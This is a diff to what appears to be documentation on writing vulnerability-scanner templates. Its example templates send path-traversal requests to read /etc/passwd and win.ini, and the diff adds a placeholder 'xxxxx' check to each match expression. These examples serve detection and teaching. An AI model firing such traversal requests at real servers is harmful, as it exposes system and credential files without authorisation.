@@ -100,13 +100,13 @@ title: '编写模板'
           cache: true
           method: GET
           path: /test/../../../../etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body) && response.body_string.contains("xxxxx")
       windows:
         request:
           cache: true
           method: GET
           path: /test/../../../../Windows/win.ini
-        expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
+        expression: response.status == 200 && response.body_string.contains("for 16-bit app support") && response.body_string.contains("xxxxx")
     expression: linux() || windows()
     detail:
       author: test
@@ -126,7 +126,7 @@ title: '编写模板'
           headers:
             Content-Type: application/x-www-form-urlencoded
           body: Language_S=../../../../windows/win.ini
-        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support") && response.body_string.contains("xxxxx")
     expression: windows0()
     detail:
       author: Chaitin
